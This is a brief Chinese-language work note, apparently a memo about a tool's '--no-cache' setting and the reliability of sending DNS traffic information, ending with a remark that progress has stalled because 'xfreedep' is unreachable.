	为啥关掉--no-cache 呢  如果不关闭的话 我们无法保证dns流量信息能成功传输到对面，因为他有时候会启动cahche中的内容造成一定的延迟传输可能会有误差
	xfreedep 进不去 所以导致 现在停滞  
















